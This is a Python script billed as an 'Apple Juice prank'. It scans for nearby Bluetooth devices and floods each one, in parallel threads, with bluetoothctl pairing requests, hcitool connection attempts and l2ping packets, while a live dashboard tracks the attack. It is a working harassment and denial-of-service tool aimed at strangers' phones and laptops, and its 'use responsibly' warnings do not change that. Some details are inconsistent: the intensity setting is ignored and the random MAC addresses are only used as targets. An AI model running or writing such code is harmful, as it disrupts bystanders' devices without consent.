import subprocess
import time
import threading
import random
import string
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.live import Live
from rich.table import Table
from rich import box
from rich.prompt import Prompt

console = Console()

class AppleJuicePrank:
    def __init__(self):
        self.is_running = False
        self.spam_threads = []
        self.target_devices = []
        self.connection_attempts = 0
        self.successful_connections = 0
        self.start_time = None
        
        # Apple device names for maximum annoyance
        self.apple_device_names = [
            "iPhone 15 Pro Max",
            "iPhone 15 Pro", 
            "iPhone 15",
            "iPhone 14 Pro Max",
            "iPhone 14 Pro",
            "iPhone 14",
            "iPhone 13 Pro Max",
            "iPhone 13 Pro",
            "iPhone 13",
            "iPhone 12 Pro Max",
            "iPhone 12 Pro",
            "iPhone 12",
            "iPhone 11 Pro Max",
            "iPhone 11 Pro",
            "iPhone 11",
            "iPhone XS Max",
            "iPhone XS",
            "iPhone XR",
            "iPhone X",
            "iPhone 8 Plus",
            "iPhone 8",
            "iPhone 7 Plus",
            "iPhone 7",
            "iPhone 6s Plus",
            "iPhone 6s",
            "iPhone 6 Plus",
            "iPhone 6",
            "iPhone SE",
            "iPad Pro 12.9-inch",
            "iPad Pro 11-inch",
            "iPad Air",
            "iPad",
            "iPad mini",
            "Apple Watch Series 9",
            "Apple Watch Series 8",
            "Apple Watch Series 7",
            "Apple Watch Series 6",
            "Apple Watch SE",
            "AirPods Pro 2nd Gen",
            "AirPods Pro",
            "AirPods 3rd Gen",
            "AirPods 2nd Gen",
            "AirPods 1st Gen",
            "AirPods Max",
            "MacBook Pro 16-inch",
            "MacBook Pro 14-inch",
            "MacBook Pro 13-inch",
            "MacBook Air 15-inch",
            "MacBook Air 13-inch",
            "iMac 24-inch",
            "iMac 27-inch",
            "Mac Studio",
            "Mac Pro",
            "Mac mini"
        ]
        
        # Generate random MAC addresses
        self.mac_addresses = self._generate_mac_addresses(100)
    
    def _generate_mac_addresses(self, count):
        """Generate random MAC addresses"""
        macs = []
        for _ in range(count):
            # Generate random MAC with Apple OUI prefixes
            apple_ouis = ["00:1B:63", "00:25:00", "00:26:08", "00:26:4A", "00:26:B0", 
                         "00:26:BB", "00:26:CA", "00:26:CC", "00:26:CD", "00:26:CE"]
            oui = random.choice(apple_ouis)
            mac = f"{oui}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
            macs.append(mac)
        return macs
    
    def _generate_random_name(self):
        """Generate random Apple device name"""
        return random.choice(self.apple_device_names)
    
    def _spam_bluetooth_requests(self, target_mac, device_name, duration):
        """Spam Bluetooth connection requests to a specific target"""
        start_time = time.time()
        request_count = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Method 1: Use bluetoothctl to send pairing requests
                self._send_pairing_request(target_mac, device_name)
                request_count += 1
                self.connection_attempts += 1
                
                # Method 2: Use hcitool for additional spam
                self._send_hci_request(target_mac)
                
                # Method 3: Use l2ping for packet flooding
                self._send_ping_flood(target_mac)
                
                # Random delay to avoid overwhelming the system
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception as e:
                console.print(f"[red]Spam error for {target_mac}: {e}")
                time.sleep(0.1)
        
        console.print(f"[yellow]Spammed {target_mac} with {request_count} requests")
    
    def _send_pairing_request(self, target_mac, device_name):
        """Send Bluetooth pairing request"""
        try:
            # Use bluetoothctl to send pairing request
            cmd = f"echo -e 'scan on\npair {target_mac}\nquit' | bluetoothctl"
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    def _send_hci_request(self, target_mac):
        """Send HCI connection request"""
        try:
            # Use hcitool for connection attempts
            subprocess.Popen(['hcitool', 'cc', target_mac], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    def _send_ping_flood(self, target_mac):
        """Send ping flood to target"""
        try:
            # Use l2ping for packet flooding
            subprocess.Popen(['l2ping', '-i', 'hci0', '-s', '100', '-c', '1', target_mac], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    def _scan_for_devices(self):
        """Scan for nearby Bluetooth devices"""
        console.print("[yellow]Scanning for nearby Bluetooth devices...")
        
        try:
            # Use bluetoothctl to scan for devices
            result = subprocess.run(['bluetoothctl', 'scan', 'on'], 
                                 capture_output=True, text=True, timeout=10)
            
            # Parse discovered devices
            devices = []
            for line in result.stdout.split('\n'):
                if 'Device' in line and 'RSSI' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        mac = parts[1]
                        name = ' '.join(parts[2:]) if len(parts) > 2 else 'Unknown Device'
                        devices.append({'mac': mac, 'name': name})
            
            return devices
            
        except Exception as e:
            console.print(f"[red]Scan error: {e}")
            return []
    
    def _create_demo_targets(self):
        """Create demo targets for testing"""
        demo_targets = [
            {'mac': 'AA:BB:CC:DD:EE:FF', 'name': 'iPhone 15 Pro'},
            {'mac': '11:22:33:44:55:66', 'name': 'Samsung Galaxy S24'},
            {'mac': 'FF:EE:DD:CC:BB:AA', 'name': 'Google Pixel 8'},
            {'mac': '55:44:33:22:11:00', 'name': 'OnePlus 12'},
            {'mac': '99:88:77:66:55:44', 'name': 'Xiaomi 14'},
            {'mac': '12:34:56:78:90:AB', 'name': 'Huawei P60'},
            {'mac': 'CD:EF:12:34:56:78', 'name': 'Sony Xperia 1 V'},
            {'mac': 'AB:CD:EF:12:34:56', 'name': 'Nothing Phone 2'},
            {'mac': '78:90:AB:CD:EF:12', 'name': 'Oppo Find X6'},
            {'mac': '34:56:78:90:AB:CD', 'name': 'Vivo X100'}
        ]
        return demo_targets
    
    def start_applejuice_prank(self, duration=300, intensity="high"):
        """Start the Apple Juice prank"""
        console.print("[bold red]🍎 Starting Apple Juice Prank!")
        console.print("[yellow]This will spam Bluetooth connection requests to nearby devices")
        console.print("[red]WARNING: This is very annoying! Use responsibly!")
        
        self.is_running = True
        self.start_time = datetime.now()
        
        # Get target devices
        console.print("\n[cyan]1. Scanning for nearby devices...")
        discovered_devices = self._scan_for_devices()
        
        if not discovered_devices:
            console.print("[yellow]No devices found, using demo targets...")
            discovered_devices = self._create_demo_targets()
        
        # Add some random MAC addresses for extra chaos
        for _ in range(20):
            random_mac = random.choice(self.mac_addresses)
            random_name = self._generate_random_name()
            discovered_devices.append({'mac': random_mac, 'name': random_name})
        
        self.target_devices = discovered_devices[:50]  # Limit to 50 targets
        
        console.print(f"[green]Found {len(self.target_devices)} target devices")
        
        # Start spamming threads
        console.print(f"\n[red]2. Starting spam attack with {intensity} intensity...")
        
        for i, device in enumerate(self.target_devices):
            if not self.is_running:
                break
                
            # Create spam thread for each device
            spam_thread = threading.Thread(
                target=self._spam_bluetooth_requests,
                args=(device['mac'], device['name'], duration),
                name=f"Spam-{i}"
            )
            spam_thread.daemon = True
            spam_thread.start()
            self.spam_threads.append(spam_thread)
            
            # Stagger thread starts to avoid overwhelming
            time.sleep(0.1)
        
        # Start monitoring dashboard
        self._start_monitoring_dashboard(duration)
    
    def _start_monitoring_dashboard(self, duration):
        """Start the monitoring dashboard"""
        try:
            with Live(self._create_dashboard(), refresh_per_second=2, screen=True) as live:
                start_time = time.time()
                
                while self.is_running and (time.time() - start_time) < duration:
                    live.update(self._create_dashboard())
                    time.sleep(0.5)
                    
        except KeyboardInterrupt:
            console.print("\n[yellow]Prank stopped by user")
        finally:
            self.stop_prank()
    
    def _create_dashboard(self):
        """Create the monitoring dashboard"""
        elapsed = (datetime.now() - self.start_time).seconds if self.start_time else 0
        remaining = max(0, 300 - elapsed)  # Assuming 5-minute duration
        
        # Create status table
        status_table = Table(title="🍎 Apple Juice Prank Status", box=box.ROUNDED)
        status_table.add_column("Metric", style="cyan")
        status_table.add_column("Value", style="green")
        status_table.add_column("Status", style="yellow")
        
        status_table.add_row("Active Threads", str(len(self.spam_threads)), "🟢 Running")
        status_table.add_row("Target Devices", str(len(self.target_devices)), "🎯 Active")
        status_table.add_row("Connection Attempts", str(self.connection_attempts), "📡 Spamming")
        status_table.add_row("Successful Connections", str(self.successful_connections), "✅ Connected")
        status_table.add_row("Elapsed Time", f"{elapsed}s", "⏱️ Running")
        status_table.add_row("Remaining Time", f"{remaining}s", "⏳ Active")
        
        # Create target devices table
        targets_table = Table(title="🎯 Target Devices", box=box.ROUNDED)
        targets_table.add_column("MAC Address", style="cyan")
        targets_table.add_column("Device Name", style="magenta")
        targets_table.add_column("Status", style="green")
        
        for device in self.target_devices[:10]:  # Show first 10
            targets_table.add_row(
                device['mac'],
                device['name'],
                "🟢 Spamming"
            )
        
        if len(self.target_devices) > 10:
            targets_table.add_row("...", f"+{len(self.target_devices) - 10} more", "...")
        
        # Combine tables
        dashboard = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                           🍎 APPLE JUICE PRANK 🍎                            ║
║                    Spamming Bluetooth Connection Requests                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

{status_table}

{targets_table}

[bold red]⚠️  WARNING: This prank is very annoying! Use responsibly! ⚠️
[bold yellow]Press Ctrl+C to stop the prank
"""
        
        return dashboard
    
    def stop_prank(self):
        """Stop the Apple Juice prank"""
        console.print("\n[yellow]Stopping Apple Juice prank...")
        self.is_running = False
        
        # Wait for threads to finish
        for thread in self.spam_threads:
            thread.join(timeout=1)
        
        # Final statistics
        elapsed = (datetime.now() - self.start_time).seconds if self.start_time else 0
        console.print(f"\n[bold green]🍎 Apple Juice Prank Complete!")
        console.print(f"[cyan]Total connection attempts: {self.connection_attempts}")
        console.print(f"[cyan]Target devices: {len(self.target_devices)}")
        console.print(f"[cyan]Duration: {elapsed} seconds")
        console.print(f"[yellow]Prank completed successfully! 🎉")

def start_applejuice_prank():
    """Start the Apple Juice prank interface"""
    prank = AppleJuicePrank()
    
    console.print("[bold red]🍎 Apple Juice Bluetooth Prank")
    console.print("[yellow]This tool spams Bluetooth connection requests to nearby devices")
    console.print("[red]WARNING: This is very annoying! Use responsibly!")
    
    # Get duration
    try:
        duration = int(Prompt.ask("[red] Enter prank duration (seconds)", default="300"))
    except (EOFError, KeyboardInterrupt, ValueError):
        duration = 300
        console.print("[yellow] Using default duration: 5 minutes")
    
    # Get intensity
    try:
        intensity = Prompt.ask("[red] Enter intensity (low/medium/high)", default="high")
    except (EOFError, KeyboardInterrupt):
        intensity = "high"
        console.print("[yellow] Using high intensity")
    
    # Confirmation
    try:
        confirm = Prompt.ask("[red] Are you sure you want to start the prank? (y/n)", default="n")
        if confirm.lower() != 'y':
            console.print("[yellow] Prank cancelled")
            return
    except (EOFError, KeyboardInterrupt):
        console.print("[yellow] Prank cancelled")
        return
    
    try:
        prank.start_applejuice_prank(duration, intensity)
    except KeyboardInterrupt:
        console.print("\n[yellow]Prank interrupted by user")
        prank.stop_prank()
    except Exception as e:
        console.print(f"[red]Prank error: {e}")

if __name__ == "__main__":
    start_applejuice_prank()
